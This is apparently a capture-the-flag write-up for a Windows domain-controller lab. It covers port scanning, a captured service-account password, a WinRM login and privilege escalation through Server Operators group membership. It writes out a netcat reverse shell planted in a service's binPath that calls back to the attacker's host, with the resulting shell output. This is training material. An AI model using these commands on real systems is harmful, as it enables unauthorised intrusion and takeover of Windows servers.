Difficulty: Medium
### Information Gathering

IP Address: 10.129.39.253

# User Flag
#### Service Enumeration

NMAP Enumeration through the ports.
```
sudo nmap 10.129.39.253
```

```
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman
```

```
sudo nmap 10.129.39.253 -sC -sV
```

Here are the obtained credentials, based on the reconnect to our listener.
`return\svc-printer%1edFg43012!!`

```
10.129.39.253    return.local
```

WinRM works perfectly fine.
```
netexec winrm 10.129.39.253 -u 'svc-printer' -p '1edFg43012!!'
```

User flag obtained successfully.
![[Screenshot 2026-07-27 at 22.25.14.png]]

# Root Flag
#### Privilege Escalation

```
whoami /groups
```

It is possible to see that the user is part of the `Server Operators` group, a highly privileged group that can modify, start and stop services.

First start a server.
```
sudo nc -lvnp 1234
```

In the WinRM Session, upload nc.exe.
```
upload nc.exe
```

Now configure the service to execute a reverse shell on our host.
```
sc.exe config AppReadiness binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe 10.10.14.104 1234"
```

Now stop and start the service.
```
sc.exe stop AppReadiness; sc.exe start AppReadiness
```

A reverse shell is now thrown on the listening port.
```
sudo nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.104] from (UNKNOWN) [10.129.39.253] 49537
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Windows\system32>
```

The root flag has been successfully obtained.
![[Screenshot 2026-07-27 at 22.53.21.png]]
